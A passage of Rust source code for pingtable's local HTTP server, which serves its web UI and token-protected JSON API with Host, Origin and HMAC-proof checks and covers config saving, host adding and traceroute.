//! Local HTTP server: the web UI and the JSON API under `/api/v1`.
//!
//! It listens on 127.0.0.1 only. Because the API can change settings that run
//! commands, three checks guard every API call:
//!
//! * the `Host` header must name this machine's loopback address (stops DNS
//!   rebinding),
//! * an `Origin` header, when present, must be this server (stops other web
//!   pages from calling in),
//! * the caller must present the token from the config file.
//!
//! One call needs no token: `GET /api/v1/hello?nonce=…`, which proves that
//! this server holds the token without revealing it. pingtable's own programs
//! ask for that proof before they send the token to whatever listens on a port.

use crate::config::{self, Config};
use hmac::{Hmac, Mac};
use pingtable_core::parse::{parse_host_list, ParseOptions};
use pingtable_core::{export, hostlist, netinfo, targets, trace, Engine, Settings};
use serde::Deserialize;
use serde_json::{json, Value};
use sha2::Sha256;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{SocketAddr, TcpStream};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tiny_http::{Header, Method, Request, Response, Server};

// The text files go through include_str!, so a file that is not UTF-8 fails the build.
const INDEX_HTML: &[u8] = include_str!("../../../ui/index.html").as_bytes();
const APP_CSS: &[u8] = include_str!("../../../ui/app.css").as_bytes();
const APP_JS: &[u8] = include_str!("../../../ui/app.js").as_bytes();
const THEME_JS: &[u8] = include_str!("../../../ui/theme.js").as_bytes();
const MANIFEST: &[u8] = include_str!("../../../ui/manifest.webmanifest").as_bytes();
const ICON_SVG: &[u8] = include_str!("../../../ui/icon.svg").as_bytes();
/// JetBrains Mono for the data, cut to Latin (SIL Open Font License 1.1; ui/fonts/OFL.txt).
const MONO_400: &[u8] = include_bytes!("../../../ui/fonts/JetBrainsMono-Regular.woff2");
const MONO_500: &[u8] = include_bytes!("../../../ui/fonts/JetBrainsMono-Medium.woff2");
const MONO_600: &[u8] = include_bytes!("../../../ui/fonts/JetBrainsMono-SemiBold.woff2");

const WORKERS: usize = 16;
const MAX_BODY: u64 = 8 * 1024 * 1024;
const MAX_WAIT_MS: u64 = 25_000;
/// After the first change, wait a little so a burst arrives as one reply:
/// this long for a small table, growing with the number of hosts.
const COALESCE_MIN_MS: u64 = 120;
const COALESCE_MAX_MS: u64 = 800;
/// Largest reply `call_local` reads.
const MAX_LOCAL_REPLY: u64 = 64 * 1024 * 1024;
/// Every `state` a row can have, for `GET /state?state=`.
const STATES: [&str; 6] = ["up", "down", "failing", "recovering", "pending", "muted"];

struct Ctx {
    engine: Engine,
    cfg: Mutex<Config>,
    path: PathBuf,
    /// The port really listened on.
    port: u16,
    token: String,
    /// Serve UI files from this folder instead of the built-in copies.
    ui_dir: Option<PathBuf>,
    /// A notice from reading the config, waiting to be shown once.
    notice: Mutex<Option<String>>,
    /// Held while the list or settings are read, changed and put back, so two
    /// changes at once cannot undo each other. Mutes are changed under it too.
    edit: Mutex<()>,
    /// Grows by one whenever the host list text changes, by any path. A
    /// window that sends back a list it loaded earlier sends this with it,
    /// so a host added meanwhile is not lost. Read and changed under `edit`.
    hosts_rev: AtomicU64,
}

/// Why the server could not start.
#[derive(Debug)]
pub enum StartError {
    /// Something already listens on the port. It may be another pingtable.
    PortInUse,
    Other(String),
}

impl std::fmt::Display for StartError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            StartError::PortInUse => write!(f, "the port is already in use by another program; pick another with --port"),
            StartError::Other(why) => write!(f, "{why}"),
        }
    }
}

/// A started server. Dropping it does not stop it; the threads end with the process.
pub struct Running {
    /// Link to the interface, including the access token.
    pub url: String,
    /// The port it listens on.
    pub port: u16,
    handles: Vec<std::thread::JoinHandle<()>>,
}

impl Running {
    /// Block for as long as the server runs.
    pub fn join(self) {
        for handle in self.handles {
            let _ = handle.join();
        }
    }
}

pub fn link(port: u16, token: &str) -> String {
    format!("http://127.0.0.1:{port}/?t={token}")
}

/// Start listening on 127.0.0.1 and answer requests on background threads.
pub fn start(engine: Engine, mut cfg: Config, path: PathBuf) -> Result<Running, StartError> {
    let asked = cfg.port;
    let server = Server::http(("127.0.0.1", asked)).map_err(|why| {
        let in_use = why
            .downcast_ref::<std::io::Error>()
            .is_some_and(|e| e.kind() == std::io::ErrorKind::AddrInUse);
        if in_use {
            StartError::PortInUse
        } else {
            StartError::Other(format!("cannot listen on 127.0.0.1:{asked}: {why}"))
        }
    })?;
    // The same as asked, unless 0 asked for any free port.
    let port = server.server_addr().to_ip().map_or(asked, |addr| addr.port());
    // Tell the programs that look for this pingtable (the MCP tools, `api`)
    // where it really is, so they do not knock on a port someone else holds.
    if let Err(why) = config::write_run_file(&path, port) {
        eprintln!("pingtable: cannot write {}: {why}", config::run_file(&path).display());
    }
    let url = link(port, &cfg.token);
    let notice = cfg.notice.take();
    let ctx = Arc::new(Ctx {
        engine,
        token: cfg.token.clone(),
        cfg: Mutex::new(cfg),
        path,
        port,
        ui_dir: ui_dir(),
        notice: Mutex::new(notice),
        edit: Mutex::new(()),
        hosts_rev: AtomicU64::new(first_hosts_rev()),
    });
    let server = Arc::new(server);
    let mut handles = Vec::new();
    for _ in 0..WORKERS {
        let server = server.clone();
        let ctx = ctx.clone();
        handles.push(std::thread::spawn(move || {
            while let Ok(request) = server.recv() {
                // A fault while answering one request ends that request only.
                let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| handle(&ctx, request)));
            }
        }));
    }
    Ok(Running { url, port, handles })
}

/// Start the saved table if autostart is enabled and it contains hosts.
pub fn autostart(engine: &Engine, enabled: bool) {
    if enabled && engine.host_count() > 0 {
        engine.start();
    }
}

/// Where this run's `hosts_rev` starts: a random number, so that a window
/// left open across a restart cannot send back its list under a number this
/// run uses too. Below 2^48, so it stays a whole number in JavaScript however
/// often the list changes.
fn first_hosts_rev() -> u64 {
    let mut bytes = [0u8; 8];
    match getrandom::fill(&mut bytes) {
        Ok(()) => (u64::from_le_bytes(bytes) >> 16).max(1),
        // No secure source (not expected): the time this run started will do.
        Err(_) => pingtable_core::now_ms().max(1) as u64,
    }
}

/// `PINGTABLE_UI_DIR` serves the interface from a folder while working on it.
/// Only a debug build reads it; a release build always serves its own copy.
fn ui_dir() -> Option<PathBuf> {
    if cfg!(debug_assertions) {
        std::env::var_os("PINGTABLE_UI_DIR").map(PathBuf::from)
    } else {
        None
    }
}

// ---------------------------------------------------------------------------
// Talking to a pingtable that already runs here
// ---------------------------------------------------------------------------

/// Proof that whoever answers on `port` holds `token`: HMAC-SHA256 keyed with
/// the token over `hello-v1`, the port and the nonce, one per line, as
/// lower-case hex. The port is part of it so that a listener on another port
/// cannot pass the question on to the real pingtable and hand back its answer.
pub fn hello_proof(token: &str, port: u16, nonce: &str) -> String {
    let mut mac = Hmac::<Sha256>::new_from_slice(token.as_bytes()).expect("HMAC takes a key of any length");
    mac.update(format!("hello-v1\n{port}\n{nonce}").as_bytes());
    mac.finalize().into_bytes().iter().map(|b| format!("{b:02x}")).collect()
}

/// A nonce is 16 to 128 letters, digits, `-` or `_`.
fn nonce_ok(nonce: &str) -> bool {
    (16..=128).contains(&nonce.len()) && nonce.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
}

/// Why a pingtable on this computer could not be used.
#[derive(Debug, PartialEq)]
pub enum LocalError {
    /// Nothing listens on the port.
    NotRunning,
    /// Something answered with a wrong proof, or not the way pingtable
    /// answers: another program, or a pingtable that uses another settings
    /// file. It was not given the token.
    Unproven,
    /// Something answered the request for a proof with the 401, and the
    /// words, of a pingtable from before that request existed (0.3.0). It
    /// was not given the token.
    Older,
    /// Something took the connection and sent nothing back in time: perhaps
    /// a pingtable too busy to answer. It was not given the token.
    NoReply,
    /// The pingtable proved itself, then the call failed.
    Failed(String),
}

impl LocalError {
    /// What to tell the person about whatever is on `port`, and what to do about it.
    pub fn explain(&self, port: u16) -> String {
        match self {
            LocalError::NotRunning => {
                format!("pingtable is not running on port {port}. Start pingtable.exe, or run pingtable-cli with no arguments.")
            }
            LocalError::Unproven => format!(
                "Another program answers on port {port} and could not prove it is this computer's pingtable, so it was not \
                 given the access token. It may be a pingtable that uses another settings file. Close that program, or start \
                 pingtable with another --port."
            ),
            LocalError::Older => format!(
                "An older pingtable seems to answer on port {port}. It cannot prove who it is the way this version asks, so \
                 it was not given the access token. Close it, then start this version."
            ),
            LocalError::NoReply => format!(
                "Something on port {port} took the connection but did not answer within 2 seconds, so it was not given the \
                 access token. If it is pingtable, it may be busy: try again in a moment. If it keeps happening, close the \
                 program that holds the port, or start pingtable with another --port."
            ),
            LocalError::Failed(why) => format!("The pingtable app did not answer properly ({why}). Try again; if it keeps failing, restart the app."),
        }
    }

    /// How much a failure says about what is going on, to pick the one to
    /// report when several ports were tried. Nothing listening says least.
    pub(crate) fn telling(&self) -> u8 {
        match self {
            LocalError::NotRunning => 0,
            LocalError::Unproven => 1,
            LocalError::NoReply => 2,
            LocalError::Older => 3,
            LocalError::Failed(_) => 4,
        }
    }
}

/// Connect to `port` and make sure whatever answers holds `token`, without
/// sending it. The same connection then carries one request, so the token
/// goes only to the listener that gave the proof.
fn connect_proven(port: u16, token: &str, wait: Duration) -> Result<BufReader<TcpStream>, LocalError> {
    let addr = SocketAddr::from(([127, 0, 0, 1], port));
    let stream = TcpStream::connect_timeout(&addr, Duration::from_secs(2)).map_err(|_| LocalError::NotRunning)?;
    let _ = stream.set_read_timeout(Some(Duration::from_secs(2)));
    let _ = stream.set_write_timeout(Some(Duration::from_secs(2)));
    let nonce = config::new_token();
    // HTTP/1.0 with keep-alive: a reply with a length, and the connection stays open.
    let hello = format!("GET /api/v1/hello?nonce={nonce} HTTP/1.0\r\nHost: 127.0.0.1:{port}\r\nConnection: keep-alive\r\n\r\n");
    (&stream).write_all(hello.as_bytes()).map_err(|_| LocalError::NoReply)?;
    let mut reader = BufReader::new(stream);
    let (status, body) = read_short_reply(&mut reader)?;
    match status {
        200 => {}
        // pingtable 0.3.0 wants the token for every call, and so refuses this
        // one, in its own words. Any other refusal is some other program.
        401 if is_older_refusal(&body) => return Err(LocalError::Older),
        _ => return Err(LocalError::Unproven),
    }
    let proof = serde_json::from_slice::<Value>(&body).ok().and_then(|doc| doc["proof"].as_str().map(str::to_owned)).unwrap_or_default();
    if !same_secret(&proof, &hello_proof(token, port, &nonce)) {
        return Err(LocalError::Unproven);
    }
    let _ = reader.get_ref().set_read_timeout(Some(wait));
    Ok(reader)
}

/// What pingtable says to an API call without the right token. pingtable
/// 0.3.0 said the same, and checked the token before it looked at the path,
/// so it answers `/hello` with exactly this.
const TOKEN_REFUSAL: &str = "Missing or wrong token. Open the link pingtable printed when it started.";

/// True when a 401 reply is pingtable 0.3.0 refusing a call without the token.
fn is_older_refusal(body: &[u8]) -> bool {
    serde_json::from_slice::<Value>(body).ok().is_some_and(|doc| doc["error"] == TOKEN_REFUSAL)
}

/// One small reply that states its length. `NoReply` when nothing came back
/// in time, `Unproven` for anything that is not such a reply.
fn read_short_reply(reader: &mut BufReader<TcpStream>) -> Result<(u16, Vec<u8>), LocalError> {
    let mut head = String::new();
    loop {
        let mut line = String::new();
        let read = reader.by_ref().take(4096).read_line(&mut line);
        match read {
            Ok(0) | Err(_) if head.is_empty() && line.is_empty() => return Err(LocalError::NoReply),
            Ok(0) | Err(_) => return Err(LocalError::Unproven),
            Ok(_) if head.len() > 16 * 1024 => return Err(LocalError::Unproven),
            Ok(_) => {}
        }
        if line.trim_end().is_empty() {
            break;
        }
        head.push_str(&line);
    }
    let status: u16 = head.split_whitespace().nth(1).and_then(|code| code.parse().ok()).ok_or(LocalError::Unproven)?;
    let length: usize = head
        .lines()
        .find_map(|line| {
            let (name, value) = line.split_once(':')?;
            if name.trim().eq_ignore_ascii_case("content-length") {
                value.trim().parse().ok()
            } else {
                None
            }
        })
        .filter(|length| *length <= 4096)
        .ok_or(LocalError::Unproven)?;
    let mut body = vec![0; length];
    reader.read_exact(&mut body).map_err(|_| LocalError::Unproven)?;
    Ok((status, body))
}

/// Make sure a pingtable that holds `token` answers on `port`, without
/// sending it the token.
pub fn prove(port: u16, token: &str) -> Result<(), LocalError> {
    connect_proven(port, token, Duration::from_secs(2)).map(|_| ())
}

/// True when a pingtable that holds `token` answers on `port`. Nothing that
/// fails to prove it is sent the token.
#[cfg(test)]
fn is_pingtable(port: u16, token: &str) -> bool {
    prove(port, token).is_ok()
}

/// What to say when `port` could not be listened on and whatever holds it
/// did not prove it is this pingtable.
pub fn port_taken(port: u16, why: &LocalError) -> String {
    match why {
        LocalError::NotRunning => format!("Port {port}: {}.", StartError::PortInUse),
        other => other.explain(port),
    }
}

/// The port of the running pingtable that uses this config: the one in its
/// run file, else the one in the config, as long as it proves who it is.
/// Otherwise the most telling failure, and the port it happened on.
pub fn find_local(path: &Path, cfg: &Config) -> Result<u16, (LocalError, u16)> {
    let mut why = (LocalError::NotRunning, cfg.port);
    for port in config::ports_to_try(path, cfg) {
        match prove(port, &cfg.token) {
            Ok(()) => return Ok(port),
            Err(failed) => {
                if failed.telling() > why.0.telling() {
                    why = (failed, port);
                }
            }
        }
    }
    Err(why)
}

/// One call to the API of a pingtable running on this computer, after it has
/// proved who it is. Returns the HTTP status and the body. `wait` is how long
/// to wait for the reply.
pub fn call_local(port: u16, token: &str, method: &str, path: &str, body: Option<&str>, wait: Duration) -> Result<(u16, String), LocalError> {
    let reader = connect_proven(port, token, wait)?;
    let failed = |why: std::io::Error| LocalError::Failed(why.to_string());
    // HTTP/1.0 asks for a plain body: no chunks to put back together.
    let mut request = format!("{method} {path} HTTP/1.0\r\nHost: 127.0.0.1:{port}\r\nX-Pingtable-Token: {token}\r\nConnection: close\r\n");
    if let Some(body) = body {
        request.push_str(&format!("Content-Type: application/json\r\nContent-Length: {}\r\n", body.len()));
    }
    request.push_str("\r\n");
    request.push_str(body.unwrap_or(""));
    reader.get_ref().write_all(request.as_bytes()).map_err(failed)?;
    let mut raw = Vec::new();
    reader.take(MAX_LOCAL_REPLY + 1).read_to_end(&mut raw).map_err(failed)?;
    if raw.len() as u64 > MAX_LOCAL_REPLY {
        // Cut short, it would not parse, and could be mistaken for something else.
        return Err(LocalError::Failed(format!("the reply was larger than {} MB", MAX_LOCAL_REPLY / (1024 * 1024))));
    }
    let reply = String::from_utf8_lossy(&raw);
    let not_http = || LocalError::Failed("the reply was not HTTP".into());
    let (head, text) = reply.split_once("\r\n\r\n").ok_or_else(not_http)?;
    let status: u16 = head.split_whitespace().nth(1).and_then(|code| code.parse().ok()).ok_or_else(not_http)?;
    let chunked = head.lines().any(|line| {
        let line = line.to_ascii_lowercase();
        line.starts_with("transfer-encoding:") && line.contains("chunked")
    });
    Ok((status, if chunked { unchunk(text) } else { text.to_string() }))
}

/// Put a chunked HTTP body back together.
fn unchunk(mut text: &str) -> String {
    let mut whole = String::new();
    while let Some((size, rest)) = text.split_once("\r\n") {
        let Ok(size) = usize::from_str_radix(size.split(';').next().unwrap_or("").trim(), 16) else { break };
        if size == 0 || rest.len() < size || !rest.is_char_boundary(size) {
            break;
        }
        whole.push_str(&rest[..size]);
        text = rest[size..].trim_start_matches("\r\n");
    }
    whole
}

/// Open a link in the default browser.
pub fn open_browser(url: &str) {
    use std::process::{Command, Stdio};
    let mut cmd = if cfg!(windows) {
        let mut c = Command::new("cmd");
        c.args(["/C", "start", "", url]);
        c
    } else if is_wsl() {
        let mut c = Command::new("explorer.exe");
        c.arg(url);
        c
    } else if cfg!(target_os = "macos") {
        let mut c = Command::new("open");
        c.arg(url);
        c
    } else {
        let mut c = Command::new("xdg-open");
        c.arg(url);
        c
    };
    let _ = cmd.stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).spawn();
}

/// Open the interface in the default browser.
///
/// On Unix every account on the machine can read the arguments a program was
/// started with, so the link with the token is not one of them: it goes into
/// a page only this account can read, and the browser is given that page.
pub fn open_ui(port: u16, token: &str) {
    let url = link(port, token);
    if cfg!(windows) || is_wsl() {
        return open_browser(&url);
    }
    match write_redirect(port, &url) {
        Ok(page) => open_browser(&page.to_string_lossy()),
        Err(why) => eprintln!("pingtable: the browser was not opened, because the link could not be handed to it privately ({why}). Open the link above."),
    }
}

/// A page that sends the browser on to `url`, readable by this account only:
/// in `$XDG_RUNTIME_DIR/pingtable`, or beside the log file.
fn write_redirect(port: u16, url: &str) -> std::io::Result<PathBuf> {
    let dir = std::env::var_os("XDG_RUNTIME_DIR")
        .map(PathBuf::from)
        .filter(|dir| dir.is_absolute() && dir.is_dir())
        .map(|dir| dir.join("pingtable"))
        .or_else(|| crate::log_path().parent().map(Path::to_path_buf))
        .ok_or_else(|| std::io::Error::other("there is no folder for it"))?;
    let mut folder = std::fs::DirBuilder::new();
    folder.recursive(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::DirBuilderExt;
        folder.mode(0o700);
    }
    folder.create(&dir)?;
    let page = dir.join(format!("open-{port}.html"));
    // Made anew each time, so it is ours and owner-only whatever was there.
    match std::fs::remove_file(&page) {
        Ok(()) => {}
        Err(why) if why.kind() == std::io::ErrorKind::NotFound => {}
        Err(why) => return Err(why),
    }
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    let href: String = url.chars().filter(|c| c.is_ascii_graphic() && !"\"'<>&".contains(*c)).collect();
    let html = format!(
        "<!doctype html>\n<html lang=\"en\"><head><meta charset=\"utf-8\"><meta name=\"referrer\" content=\"no-referrer\">\n\
         <meta http-equiv=\"refresh\" content=\"0; url={href}\"><title>pingtable</title></head>\n\
         <body><p><a href=\"{href}\">Open pingtable</a></p></body></html>\n"
    );
    options.open(&page)?.write_all(html.as_bytes())?;
    Ok(page)
}

/// Replace settings and host list, keep mutes for hosts that remain, and save
/// the config file. Returns the parser's warnings and a save error, if any.
/// The caller holds `ctx.edit`.
///
/// With `commands_locked` set in the file, the alert commands stay as the
/// file has them, whatever `settings` says.
fn apply_and_save(ctx: &Ctx, mut settings: Settings, hosts_text: &str, keep_stats: bool, autostart: Option<bool>) -> (Vec<String>, Option<String>) {
    let engine = &ctx.engine;
    if let Some((on_down, on_up)) = locked_commands(ctx) {
        settings.on_down_command = on_down;
        settings.on_up_command = on_up;
    }
    let (_, text_before) = engine.config();
    let warnings = engine.apply_config(settings, hosts_text, keep_stats);
    let (settings, hosts_text) = engine.config();
    if hosts_text != text_before {
        ctx.hosts_rev.fetch_add(1, Ordering::SeqCst);
    }
    let mut cfg = ctx.cfg.lock().unwrap_or_else(|p| p.into_inner());
    engine.mute_keys(&cfg.muted);
    cfg.muted = engine.muted_keys();
    cfg.settings = settings;
    cfg.hosts_text = hosts_text;
    if let Some(autostart) = autostart {
        cfg.autostart = autostart;
    }
    let saved = save(ctx, &mut cfg).err().map(|why| why.to_string());
    (warnings, saved)
}

/// The alert commands to keep, when they are locked: the ones in the
/// settings file. None when they are not locked.
///
/// `commands_locked` is set by hand in the file, perhaps while pingtable
/// runs, so the file is read each time. When it cannot be read, what it said
/// at the start stands, with the commands that run now.
fn locked_commands(ctx: &Ctx) -> Option<(String, String)> {
    match config::on_disk(&ctx.path) {
        Some(file) => file.commands_locked.then_some((file.settings.on_down_command, file.settings.on_up_command)),
        None => {
            let locked = ctx.cfg.lock().unwrap_or_else(|p| p.into_inner()).commands_locked;
            locked.then(|| {
                let (current, _) = ctx.engine.config();
                (current.on_down_command, current.on_up_command)
            })
        }
    }
}

/// The host list's revision. The caller holds `ctx.edit`, so the list cannot
/// change between reading it and reading this.
fn hosts_rev(ctx: &Ctx) -> u64 {
    ctx.hosts_rev.load(Ordering::SeqCst)
}

/// Whether the alert commands are locked, as the settings file says now.
fn commands_locked(ctx: &Ctx) -> bool {
    match config::on_disk(&ctx.path) {
        Some(file) => file.commands_locked,
        None => ctx.cfg.lock().unwrap_or_else(|p| p.into_inner()).commands_locked,
    }
}

/// Save the settings file. `commands_locked` belongs to the person editing
/// the file, so it is written as the file has it now, not as it was when
/// pingtable started. While it is set, so do the two commands: one edited by
/// hand while pingtable runs is kept, and the engine takes it up too.
fn save(ctx: &Ctx, cfg: &mut Config) -> std::io::Result<()> {
    if let Some(file) = config::on_disk(&ctx.path) {
        cfg.commands_locked = file.commands_locked;
        if file.commands_locked {
            ctx.engine.set_alert_commands(&file.settings.on_down_command, &file.settings.on_up_command);
            cfg.settings.on_down_command = file.settings.on_down_command;
            cfg.settings.on_up_command = file.settings.on_up_command;
        }
    }
    config::save(&ctx.path, cfg)
}

/// Fields `PUT /config` takes.
const CONFIG_FIELDS: [&str; 5] = ["settings", "hosts_text", "hosts_rev", "keep_stats", "autostart"];
/// Fields `GET /config` adds that cannot be changed through it. `PUT` takes
/// them and leaves them alone, so a script can send back what it read with
/// one value changed.
const CONFIG_READ_ONLY: [&str; 4] = ["schema_version", "groups", "commands_locked", "config_path"];

/// Refuse a field name that is not one of `known`, and name the one meant.
/// Ignored, `{"settings": {"timeout": 500}}` would change nothing and say ok.
/// `no_such` starts the sentence (`There is no setting`), `all` ends it.
fn unknown_field(given: &serde_json::Map<String, Value>, known: &[&str], no_such: &str, all: &str) -> Result<(), String> {
    let Some(unknown) = given.keys().find(|key| !known.contains(&key.as_str())) else { return Ok(()) };
    Err(match crate::mcp::closest(unknown, known) {
        Some(meant) => format!("{no_such} \"{unknown}\". Did you mean \"{meant}\"? {all}"),
        None => format!("{no_such} \"{unknown}\". {all}"),
    })
}

/// `settings` with the fields in `changes` put over it. Fields left out keep
/// their values, so a caller can send only the ones it means to change.
fn merged_settings(settings: &Settings, changes: Option<serde_json::Map<String, Value>>) -> Result<Settings, String> {
    let Some(changes) = changes else { return Ok(settings.clone()) };
    let mut whole = serde_json::to_value(settings).map_err(|why| why.to_string())?;
    if let Some(fields) = whole.as_object_mut() {
        let known: Vec<&str> = fields.keys().map(String::as_str).collect();
        unknown_field(&changes, &known, "There is no setting", "GET /config lists every setting under \"settings\".")?;
        fields.extend(changes);
    }
    serde_json::from_value(whole).map_err(|why| format!("The settings are not valid: {why}."))
}

/// Add hosts to the list from the table, without opening the list editor.
fn add_hosts(ctx: &Ctx, body: &AddBody) -> Result<serde_json::Value, String> {
    let group = body.group.as_deref().map(str::trim).filter(|g| !g.is_empty());
    // A line break would let a group name write list lines of its own.
    if group.is_some_and(|g| g.chars().any(char::is_control)) {
        return Err("A group name must be one line of text, without line breaks.".into());
    }
    let entries: Vec<String> = body.entries.iter().map(|e| e.split_whitespace().collect::<Vec<_>>().join(" ")).filter(|e| !e.is_empty()).collect();
    if entries.is_empty() {
        return Err("Type a host name or an address.".into());
    }
    let ports = chosen_ports(&body.ports, &body.ports_text)?;
    let entries: Vec<String> = entries.iter().flat_map(|e| targets::entries_for_ports(e, &ports, body.ping)).collect();
    let _editing = ctx.edit.lock().unwrap_or_else(|p| p.into_inner());
    let (mut settings, mut text) = ctx.engine.config();
    // A description needs the one-host-per-line form; switch the list to it when one is given.
    let has_description = entries.iter().any(|e| e.split(' ').skip(1).any(|w| !w.contains('=')));
    if !settings.description_format && has_description {
        text = hostlist::to_described(&text);
        settings.description_format = true;
    }
    let options = ParseOptions {
        description_format: settings.description_format,
        cidr_skip_first: settings.cidr_skip_first,
        cidr_skip_last: settings.cidr_skip_last,
    };
    let mut added = 0;
    for entry in &entries {
        if entry.starts_with('#') || entry.to_ascii_lowercase().starts_with("group:") {
            return Err(format!("\"{entry}\" is not a host. Pick the group below instead."));
        }
        let report = parse_host_list(entry, &options);
        if let Some(warning) = report.warnings.first() {
            return Err(warning.trim_start_matches("Line 1: ").to_string());
        }
        if report.hosts.is_empty() {
            return Err(format!("\"{entry}\" is not a host name or an address."));
        }
        added += report.hosts.len();
    }
    let new_text = hostlist::add_entries(&text, group, &entries);
    let (_, saved) = apply_and_save(ctx, settings, &new_text, true, None);
    Ok(json!({ "ok": true, "added": added, "group": group, "save_error": saved }))
}

/// The ports a request asks for, from every place it can name them, without
/// repeats and within the limit of one check.
fn chosen_ports(listed: &[u16], typed: &str) -> Result<Vec<u16>, String> {
    let mut ports: Vec<u16> = Vec::new();
    for port in listed.iter().copied().chain(targets::parse_ports(typed)?) {
        if port == 0 {
            return Err("0 is not a port number (1 to 65535).".into());
        }
        if !ports.contains(&port) {
            ports.push(port);
        }
    }
    if ports.len() > targets::MAX_PORTS {
        return Err(format!("That is more than {} ports. Choose fewer at a time.", targets::MAX_PORTS));
    }
    Ok(ports)
}

/// Trace the route to one host and reply with the hops.
fn trace_host(ctx: &Ctx, request: Request, id: u32) {
    let Some(detail) = ctx.engine.detail(id) else {
        return reply_error(request, 404, "No such host.");
    };
    let (settings, _) = ctx.engine.config();
    let target = detail
        .row
        .ip
        .as_deref()
        .and_then(|ip| ip.parse().ok())
        .or_else(|| netinfo::resolve_within(&detail.row.host, settings.prefer_ipv6, netinfo::LOOKUP_LIMIT));
    let Some(target) = target else {
        return reply_error(request, 409, "The name does not resolve, so there is nothing to trace.");
    };
    let timeout = Duration::from_millis(settings.timeout_ms.clamp(500, 2000) as u64);
    let hops = trace::traceroute(target, trace::MAX_HOPS, timeout, true);
    reply_json(
        request,
        200,
        &json!({
            "schema_version": 1,
            "host": detail.row.host,
            "target": target,
            "from": netinfo::local_name(),
            "source": netinfo::source_for(target),
            "reached": hops.last().is_some_and(|h| h.reached),
            "hops": hops,
        }),
    );
}

fn is_wsl() -> bool {
    std::fs::read_to_string("/proc/version").map(|v| v.to_ascii_lowercase().contains("microsoft")).unwrap_or(false)
}

// ---------------------------------------------------------------------------
// Request plumbing
// ---------------------------------------------------------------------------

fn header<'a>(request: &'a Request, name: &'static str) -> Option<&'a str> {
    request.headers().iter().find(|h| h.field.equiv(name)).map(|h| h.value.as_str())
}

fn query_param<'a>(query: &'a str, name: &str) -> Option<&'a str> {
    query.split('&').filter_map(|pair| pair.split_once('=')).find(|(k, _)| *k == name).map(|(_, v)| v)
}

fn loopback_names(port: u16) -> [String; 3] {
    [format!("127.0.0.1:{port}"), format!("localhost:{port}"), format!("[::1]:{port}")]
}

fn host_allowed(request: &Request, port: u16) -> bool {
    match header(request, "Host") {
        Some(host) => loopback_names(port).iter().any(|ok| host.eq_ignore_ascii_case(ok)),
        None => false,
    }
}

fn origin_allowed(request: &Request, port: u16) -> bool {
    match header(request, "Origin") {
        Some(origin) => loopback_names(port).iter().any(|ok| origin.eq_ignore_ascii_case(&format!("http://{ok}"))),
        None => true,
    }
}

fn same_secret(a: &str, b: &str) -> bool {
    a.len() == b.len() && a.bytes().zip(b.bytes()).fold(0u8, |acc, (x, y)| acc | (x ^ y)) == 0
}

fn reply(request: Request, status: u16, content_type: &str, body: Vec<u8>, extra: &[(&str, &str)]) {
    let mut response = Response::from_data(body).with_status_code(status);
    let mut add = |name: &str, value: &str| {
        if let Ok(h) = Header::from_bytes(name.as_bytes(), value.as_bytes()) {
            response.add_header(h);
        }
    };
    add("Content-Type", content_type);
    add("Cache-Control", "no-store");
    add("X-Content-Type-Options", "nosniff");
    add("Referrer-Policy", "no-referrer");
    // No other site may load anything from here, not even as an image or a script.
    add("Cross-Origin-Resource-Policy", "same-origin");
    for (name, value) in extra {
        add(name, value);
    }
    let _ = request.respond(response);
}

fn reply_json(request: Request, status: u16, value: &impl serde::Serialize) {
    let body = serde_json::to_vec(value).unwrap_or_else(|_| b"{}".to_vec());
    reply(request, status, "application/json; charset=utf-8", body, &[]);
}

fn reply_error(request: Request, status: u16, message: &str) {
    reply_json(request, status, &json!({ "error": message }));
}

fn read_json<T: for<'de> Deserialize<'de>>(request: &mut Request) -> Result<T, String> {
    let mut body = String::new();
    request
        .as_reader()
        .take(MAX_BODY)
        .read_to_string(&mut body)
        .map_err(|why| format!("could not read the request body: {why}"))?;
    serde_json::from_str(&body).map_err(|why| format!("request body is not valid: {why}"))
}

// ---------------------------------------------------------------------------
// Routing
// ---------------------------------------------------------------------------

fn handle(ctx: &Ctx, request: Request) {
    let url = request.url().to_string();
    let (path, query) = url.split_once('?').unwrap_or((url.as_str(), ""));

    if !host_allowed(&request, ctx.port) {
        return reply_error(request, 403, "This server only answers on its loopback address.");
    }
    if !path.starts_with("/api/") {
        return serve_static(ctx, request, path);
    }
    if !origin_allowed(&request, ctx.port) {
        return reply_error(request, 403, "Cross-origin requests are not allowed.");
    }
    if path == "/api/v1/hello" {
        // No token: this is how a client makes sure it talks to this
        // pingtable before it sends the token.
        return hello(ctx, request, query);
    }
    let presented = header(&request, "X-Pingtable-Token").or_else(|| query_param(query, "t")).unwrap_or("");
    if !same_secret(presented, &ctx.token) {
        return reply_error(request, 401, TOKEN_REFUSAL);
    }
    api(ctx, request, path, query);
}

/// `GET /api/v1/hello?nonce=…`: prove this server holds the token.
fn hello(ctx: &Ctx, request: Request, query: &str) {
    if *request.method() != Method::Get {
        return reply_error(request, 405, "Method not allowed.");
    }
    match query_param(query, "nonce") {
        Some(nonce) if nonce_ok(nonce) => reply_json(request, 200, &json!({ "schema_version": 1, "proof": hello_proof(&ctx.token, ctx.port, nonce) })),
        _ => reply_error(request, 400, "Add nonce= with 16 to 128 letters, digits, - or _, new for every check."),
    }
}

fn serve_static(ctx: &Ctx, request: Request, path: &str) {
    if *request.method() != Method::Get {
        return reply_error(request, 405, "Method not allowed.");
    }
    let (file, content_type, built_in) = match path {
        "/" | "/index.html" => ("index.html", "text/html; charset=utf-8", INDEX_HTML),
        "/app.css" => ("app.css", "text/css; charset=utf-8", APP_CSS),
        "/app.js" => ("app.js", "text/javascript; charset=utf-8", APP_JS),
        "/theme.js" => ("theme.js", "text/javascript; charset=utf-8", THEME_JS),
        "/manifest.webmanifest" => ("manifest.webmanifest", "application/manifest+json", MANIFEST),
        "/icon.svg" | "/favicon.ico" => ("icon.svg", "image/svg+xml", ICON_SVG),
